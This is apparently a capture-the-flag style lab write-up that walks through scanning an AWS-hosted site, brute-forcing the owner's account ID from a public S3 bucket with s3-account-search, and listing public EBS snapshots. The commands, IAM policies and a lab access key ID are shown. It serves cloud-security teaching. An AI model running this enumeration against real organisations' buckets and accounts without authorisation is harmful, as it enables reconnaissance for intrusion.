---
title: Identify the AWS Account ID from a Public S3 Bucket
description: Identify the AWS Account ID from a Public S3 Bucket
image:
  path: aws.jpg
categories:
- Pwned Labs
- AWS
layout: post
media_subpath: /assets/posts/labs/pwnedlabs/aws/
tags:
- pwnedlabs
- aws
- cloud
---
# Scenario
The ability to expose and leverage even the smallest oversights is a coveted skill. A global Logistics Company has reached out to our cybersecurity company for assistance and have provided the IP address of their website. Your objective? Start the engagement and use this IP address to identify their AWS account ID via a public S3 bucket so we can commence the process of enumeration.


# Walkthrough


We are given IP, the port scan shows HTTP port is open
```
└─$ nmap -Pn 54.204.171.32
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-12 00:45 +06
Nmap scan report for ec2-54-204-171-32.compute-1.amazonaws.com (54.204.171.32)
Host is up (0.24s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 20.69 seconds
```

Website has no
![](identify-the-aws-account-id-from-a-public-s3-bucket-1.png)

If we check source code, we see that images are hosted in S3 bucket

![](identify-the-aws-account-id-from-a-public-s3-bucket-2.png)

We can inspect the bucket via browser, but nothing interesting

![](identify-the-aws-account-id-from-a-public-s3-bucket-3.png)

There is a [research](https://cloudar.be/awsblog/finding-the-account-id-of-any-public-s3-bucket/) which shows that it is possible to brute force AWS Account ID based on S3 bucket. The [code](https://github.com/WeAreCloudar/s3-account-search/blob/main/s3_account_search/cli.py) requires user, role and trust policy. But we are provided with one already to perform the attack. 

Let's assume we are not given one:
- Create an IAM user in your own AWS account. The IAM user assuming the role should have the following policy attached (inline policy can be used too).
```
{
    "Version": "2012-10-17",
    "Statement": {
        "Effect": "Allow",
        "Action": "sts:AssumeRole",
        "Resource": "arn:aws:iam::<your aws account id>:role/<your role name>"
    }
}
```

- Then create the role. Create and attach the policy below, that allows performing the attack on any S3 bucket that you are authorized to assess
```
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllBucketsGetObject",
      "Effect": "Allow",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::*/*"
    },
    {
      "Sid": "AllBucketsList",
      "Effect": "Allow",
      "Action": "s3:ListBucket",
      "Resource": "arn:aws:s3:::*"
    }
  ]
}
```

The role created should also have the following trust policy, allowing user to assume the role
```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "AWS": "arn:aws:iam::<your aws account id>:user/<your iam user name>"
            },
            "Action": "sts:AssumeRole"
        }
    ]
}
```

Now, let's authenticate
```
└─$ aws configure            
AWS Access Key ID [****************FGCD]: AKIAWHEOTHRFW4CEP7HK
AWS Secret Access Key [****************Y6jP]: <REDACTED>
Default region name [us-east-1]: 
Default output format [None]: 
```
```
└─$ aws sts get-caller-identity
{
    "UserId": "AIDAWHEOTHRF62U7I6AWZ",
    "Account": "427648302155",
    "Arn": "arn:aws:iam::427648302155:user/s3user"
}
```

Now use `s3-account-search` to brute-force AWS Account ID. It requires Amazon Resource Name (ARN) of the role under our control (for example, from our own AWS account), and a target S3 bucket in the AWS account whose ID will be brute-forced

```
└─$ s3-account-search arn:aws:iam::427648302155:role/LeakyBucket mega-big-tech
Starting search (this can take a while)
found: 1
found: 10
found: 107
found: 1075
found: 10751
found: 107513
found: 1075135
found: 10751350
found: 107513503
found: 1075135037
found: 10751350379
found: 107513503799
```

We found AWS account ID `107513503799`. It can be used to find public resources that could have been accidently exposed, such as public EBS and RDS snapshots. 

> To find the S3 bucket region there's a trick with cURL
{: .prompt-info }
```
└─$ curl -I https://mega-big-tech.s3.amazonaws.com
HTTP/1.1 200 OK
x-amz-id-2: EsiGZTflnOpbbFa6alHMrwXFVKA5UROedIkvd5Bd+0KQFnUmyyouhWCbtjGCj2fhNu1i8vRtqyU=
x-amz-request-id: BFKY0EZW2GSER9YY
Date: Mon, 11 Aug 2025 19:20:12 GMT
x-amz-bucket-region: us-east-1
x-amz-access-point-alias: false
Content-Type: application/xml
Transfer-Encoding: chunked
Server: AmazonS3

```

We can list the public EBS snapshots that were created in the AWS account `107513503799 `
```
└─$ aws ec2 describe-snapshots --owner-ids 107513503799 --restorable-by-user-ids all --query "Snapshots[*].{ID:SnapshotId,StartTime:StartTime,VolumeSize:VolumeSize,Description:Description}" --output table
-----------------------------------------------------------------------------------------------------------------------------------------------
|                                                              DescribeSnapshots                                                              |
+------------------------------------------------------------------------+-------------------------+---------------------------+--------------+
|                               Description                              |           ID            |         StartTime         | VolumeSize   |
+------------------------------------------------------------------------+-------------------------+---------------------------+--------------+
|  Created by CreateImage(i-089b146125db92ee4) for ami-0676627ee43624fb2 |  snap-08580043db7a923f6 |  2023-06-25T23:08:45.155Z |  8           |
+------------------------------------------------------------------------+-------------------------+---------------------------+--------------+
```